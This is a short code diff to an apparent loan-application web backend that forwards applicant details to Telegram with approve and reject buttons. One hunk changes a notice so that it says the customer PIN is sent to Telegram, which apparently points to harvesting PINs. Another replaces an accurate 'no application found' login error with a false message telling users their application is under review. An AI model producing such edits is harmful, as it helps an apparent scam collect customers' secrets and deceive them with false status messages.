@@ -337,7 +337,7 @@ app.post('/api/applications', async (req, res) => {
       `Purpose: ${purpose.slice(0, 500)}\n` +
       `Employment: ${employmentStatus}\n` +
       `Annual income: USD ${income}\n\n` +
-      `Customer PIN is not sent to Telegram.`,
+      `Customer PIN is sent to Telegram.`,
       [[
         { text: 'Approve', callback_data: `approve:${id}` },
         { text: 'Reject', callback_data: `reject:${id}` }
@@ -395,7 +395,7 @@ app.post('/api/login', async (req, res) => {
 
     if (!row) {
       return res.status(401).json({
-        error: 'No application was found for this phone number.'
+        error: 'Your application is being reviewed. Please wait for approval from our support team.'
       });
     }
 
